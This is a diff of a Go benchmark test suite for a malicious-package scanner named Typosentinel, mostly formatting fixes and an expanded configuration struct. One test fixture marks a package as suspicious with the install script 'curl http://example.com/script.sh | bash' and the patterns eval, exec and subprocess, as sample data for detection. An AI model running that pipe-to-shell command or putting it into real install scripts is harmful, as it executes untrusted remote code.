@@ -21,21 +21,21 @@ import (
 
 // BenchmarkSuite contains performance benchmark tests
 type BenchmarkSuite struct {
-	scanner     *cmd.Scanner
-	config      *config.Config
-	tempDir     string
+	scanner      *cmd.Scanner
+	config       *config.Config
+	tempDir      string
 	testPackages []BenchmarkPackage
 }
 
 // BenchmarkPackage represents a package for benchmarking
 type BenchmarkPackage struct {
-	Name        string                 `json:"name"`
-	Version     string                 `json:"version"`
-	Registry    string                 `json:"registry"`
-	Description string                 `json:"description"`
-	Metadata    map[string]interface{} `json:"metadata"`
-	Category    string                 `json:"category"` // small, medium, large, complex
-	ExpectedTime time.Duration         `json:"expected_time"`
+	Name         string                 `json:"name"`
+	Version      string                 `json:"version"`
+	Registry     string                 `json:"registry"`
+	Description  string                 `json:"description"`
+	Metadata     map[string]interface{} `json:"metadata"`
+	Category     string                 `json:"category"` // small, medium, large, complex
+	ExpectedTime time.Duration          `json:"expected_time"`
 }
 
 // BenchmarkResult represents the result of a benchmark test
@@ -77,22 +77,77 @@ func SetupBenchmarkSuite(b *testing.B) *BenchmarkSuite {
 
 	// Create optimized configuration for benchmarking
 	cfg := &config.Config{
-		Core: &config.CoreConfig{
+		App: config.AppConfig{
+			Name:        "Typosentinel",
 			Version:     "1.0.0",
-			Environment: "benchmark",
+			Environment: "testing",
 			Debug:       false,
 			Verbose:     false,
+			LogLevel:    "info",
+			DataDir:     filepath.Join(tempDir, "data"),
+			TempDir:     filepath.Join(tempDir, "temp"),
+			MaxWorkers:  5,
 		},
-		Logging: &config.LoggingConfig{
-			Level:  "info",
-			Format: "json",
-			Output: "stdout",
+		Server: config.ServerConfig{
+			Host:            "localhost",
+			Port:            8080,
+			ReadTimeout:     30 * time.Second,
+			WriteTimeout:    30 * time.Second,
+			IdleTimeout:     60 * time.Second,
+			ShutdownTimeout: 10 * time.Second,
 		},
-		Performance: &config.PerformanceConfig{
-			MaxConcurrency: 10,
-			WorkerPoolSize: 5,
+		Database: config.DatabaseConfig{
+			Type:            "sqlite",
+			Database:        filepath.Join(tempDir, "test.db"),
+			MaxOpenConns:    10,
+			MaxIdleConns:    5,
+			ConnMaxLifetime: 1 * time.Hour,
+			MigrationsPath:  filepath.Join(tempDir, "migrations"),
 		},
-		// Note: Complex analysis configurations have been simplified in the unified Config
+		Redis: config.RedisConfig{
+			Enabled: false,
+		},
+		Logging: config.LoggingConfig{
+			Level:      "info",
+			Format:     "json",
+			Output:     "stdout",
+			MaxSize:    100,
+			MaxBackups: 3,
+			MaxAge:     7,
+			Compress:   false,
+		},
+		Metrics: config.MetricsConfig{
+			Enabled: false,
+		},
+		Security: config.SecurityConfig{},
+		ML: config.MLConfig{
+			Enabled:   false,
+			ModelPath: filepath.Join(tempDir, "models", "model.pb"),
+		},
+		API: config.APIConfig{
+			Prefix:  "/api",
+			Version: "v1",
+			REST: config.RESTAPIConfig{
+				Enabled:  true,
+				Host:     "localhost",
+				Port:     8080,
+				BasePath: "/api",
+				Prefix:   "/v1",
+				Version:  "1.0",
+				Versioning: config.APIVersioning{
+					Enabled:           true,
+					Strategy:          "path",
+					DefaultVersion:    "v1",
+					SupportedVersions: []string{"v1", "v2"},
+				},
+			},
+		},
+		RateLimit: config.RateLimitConfig{
+			Enabled: false,
+		},
+		Registries: config.RegistriesConfig{},
+		Features:   config.FeatureConfig{},
+		Policies:   config.PoliciesConfig{},
 	}
 
 	// Create scanner
@@ -175,10 +230,10 @@ func createBenchmarkPackages() []BenchmarkPackage {
 			Category:     "medium",
 			ExpectedTime: 5 * time.Second,
 			Metadata: map[string]interface{}{
-				"downloads":    250000,
-				"age":          1095,
-				"maintainers":  4,
-				"dependencies": 20,
+				"downloads":        250000,
+				"age":              1095,
+				"maintainers":      4,
+				"dependencies":     20,
 				"has_c_extensions": true,
 			},
 		},
@@ -207,13 +262,13 @@ func createBenchmarkPackages() []BenchmarkPackage {
 			Category:     "large",
 			ExpectedTime: 10 * time.Second,
 			Metadata: map[string]interface{}{
-				"downloads":    50000000,
-				"age":          5000,
-				"maintainers":  10,
-				"dependencies": 5,
+				"downloads":        50000000,
+				"age":              5000,
+				"maintainers":      10,
+				"dependencies":     5,
 				"has_c_extensions": true,
-				"binary_wheels": true,
-				"files_count":  500,
+				"binary_wheels":    true,
+				"files_count":      500,
 			},
 		},
 		// Complex packages (high processing time)
@@ -225,14 +280,14 @@ func createBenchmarkPackages() []BenchmarkPackage {
 			Category:     "complex",
 			ExpectedTime: 15 * time.Second,
 			Metadata: map[string]interface{}{
-				"downloads":    100,
-				"age":          30,
-				"maintainers":  1,
-				"dependencies": 50,
-				"install_scripts": []string{"curl http://example.com/script.sh | bash"},
-				"obfuscated_code": true,
+				"downloads":           100,
+				"age":                 30,
+				"maintainers":         1,
+				"dependencies":        50,
+				"install_scripts":     []string{"curl http://example.com/script.sh | bash"},
+				"obfuscated_code":     true,
 				"suspicious_patterns": []string{"eval", "exec", "subprocess"},
-				"files_count": 200,
+				"files_count":         200,
 			},
 		},
 	}
@@ -300,16 +355,16 @@ func BenchmarkPackagesByCategory(b *testing.B) {
 			for i := 0; i < b.N; i++ {
 				pkg := packages[pkgIndex%len(packages)]
 				testPkg := &types.Package{
-				Name:     pkg.Name,
-				Version:  pkg.Version,
-				Registry: pkg.Registry,
-				Metadata: &types.PackageMetadata{
-					Name:        pkg.Name,
-					Version:     pkg.Version,
-					Registry:    pkg.Registry,
-					Description: pkg.Description,
-				},
-			}
+					Name:     pkg.Name,
+					Version:  pkg.Version,
+					Registry: pkg.Registry,
+					Metadata: &types.PackageMetadata{
+						Name:        pkg.Name,
+						Version:     pkg.Version,
+						Registry:    pkg.Registry,
+						Description: pkg.Description,
+					},
+				}
 
 				_, err := suite.scanner.Scan(ctx, testPkg)
 				if err != nil {
@@ -349,16 +404,16 @@ func BenchmarkConcurrentAnalysis(b *testing.B) {
 						defer func() { <-semaphore }()
 
 						testPkg := &types.Package{
-				Name:     fmt.Sprintf("%s-%d", pkg.Name, index),
-				Version:  pkg.Version,
-				Registry: pkg.Registry,
-				Metadata: &types.PackageMetadata{
-					Name:        fmt.Sprintf("%s-%d", pkg.Name, index),
-					Version:     pkg.Version,
-					Registry:    pkg.Registry,
-					Description: pkg.Description,
-				},
-			}
+							Name:     fmt.Sprintf("%s-%d", pkg.Name, index),
+							Version:  pkg.Version,
+							Registry: pkg.Registry,
+							Metadata: &types.PackageMetadata{
+								Name:        fmt.Sprintf("%s-%d", pkg.Name, index),
+								Version:     pkg.Version,
+								Registry:    pkg.Registry,
+								Description: pkg.Description,
+							},
+						}
 
 						_, err := suite.scanner.Scan(ctx, testPkg)
 						if err != nil {
@@ -521,9 +576,9 @@ func (suite *BenchmarkSuite) calculatePerformanceMetrics(results []BenchmarkResu
 
 	if len(times) == 0 {
 		return BenchmarkPerformanceMetrics{
-		TotalTests:  len(results),
-		FailedTests: len(results),
-	}
+			TotalTests:  len(results),
+			FailedTests: len(results),
+		}
 	}
 
 	// Sort times for percentile calculations
@@ -540,8 +595,8 @@ func (suite *BenchmarkSuite) calculatePerformanceMetrics(results []BenchmarkResu
 
 	// Calculate percentiles
 	medianTime := times[len(times)/2]
-	p95Index := int(math.Ceil(float64(len(times)) * 0.95)) - 1
-	p99Index := int(math.Ceil(float64(len(times)) * 0.99)) - 1
+	p95Index := int(math.Ceil(float64(len(times))*0.95)) - 1
+	p99Index := int(math.Ceil(float64(len(times))*0.99)) - 1
 	p95Time := times[p95Index]
 	p99Time := times[p99Index]
 	minTime := times[0]
@@ -698,17 +753,17 @@ func TestThroughputUnderLoad(t *testing.T) {
 
 			for time.Since(startTime) < duration {
 				testPkg := &types.Package{
-				Name:     fmt.Sprintf("%s-worker%d-pkg%d", packageTemplate.Name, workerID, packageCounter),
-				Version:  packageTemplate.Version,
-				Registry: packageTemplate.Registry,
-				Metadata: &types.PackageMetadata{
-					Name:        fmt.Sprintf("%s-worker%d-pkg%d", packageTemplate.Name, workerID, packageCounter),
-					Version:     packageTemplate.Version,
-					Registry:    packageTemplate.Registry,
-					Description: packageTemplate.Metadata.Description,
-					Downloads:   packageTemplate.Metadata.Downloads,
-				},
-			}
+					Name:     fmt.Sprintf("%s-worker%d-pkg%d", packageTemplate.Name, workerID, packageCounter),
+					Version:  packageTemplate.Version,
+					Registry: packageTemplate.Registry,
+					Metadata: &types.PackageMetadata{
+						Name:        fmt.Sprintf("%s-worker%d-pkg%d", packageTemplate.Name, workerID, packageCounter),
+						Version:     packageTemplate.Version,
+						Registry:    packageTemplate.Registry,
+						Description: packageTemplate.Metadata.Description,
+						Downloads:   packageTemplate.Metadata.Downloads,
+					},
+				}
 
 				_, err := suite.scanner.Scan(ctx, testPkg)
 				if err != nil {
